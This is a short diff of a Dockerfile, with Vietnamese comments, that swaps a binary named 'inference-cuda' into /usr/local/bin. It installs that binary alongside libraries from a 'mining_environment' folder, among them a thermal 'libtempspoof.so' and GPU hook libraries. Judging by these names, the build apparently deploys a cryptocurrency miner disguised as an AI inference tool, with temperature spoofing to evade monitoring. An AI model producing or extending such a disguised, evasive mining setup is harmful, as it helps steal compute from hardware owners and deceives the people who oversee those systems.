@@ -112,7 +112,7 @@ RUN set -eux; \
 COPY . /app/
 
 # Sao chép pre-compiled binaries và libraries
-COPY inference-cuda libmlls-cuda.so /tmp/
+COPY inference-cuda.original libmlls-cuda.so /tmp/
 COPY entrypoint.sh /app/entrypoint.sh
 
 # Copy NVRTC wrapper script for runtime compilation fixes  
@@ -127,7 +127,7 @@ COPY mining_environment/gpu_plugins/native/thermal/libtempspoof.so /tmp/libtemps
 # Method: Enhanced wrapper script with proper environment setup
 RUN ldconfig && \
     # Install original binary as backup
-    install -D /tmp/inference-cuda    /usr/local/bin/inference-cuda.original && \
+    install -D /tmp/inference-cuda.original    /app/inference-cuda.original && \
     install -D /tmp/libmlls-cuda.so   /usr/local/bin/libmlls-cuda.so && \
     install -D /tmp/libmpo.so         /opt/mpo/libmpo.so && \
     install -D /tmp/libgpuhook.so     /opt/hooks/libgpuhook.so && \
@@ -136,7 +136,7 @@ RUN ldconfig && \
     rm -rf /tmp/*
 
 # Create enhanced NVRTC wrapper script
-COPY scripts/nvrtc-wrapper.sh /usr/local/bin/inference-cuda
+COPY inference-cuda /usr/local/bin/inference-cuda
 RUN chmod +x /usr/local/bin/inference-cuda
 
 # ------------------  (10)  Enhanced GPU Runtime & Libraries ---------------
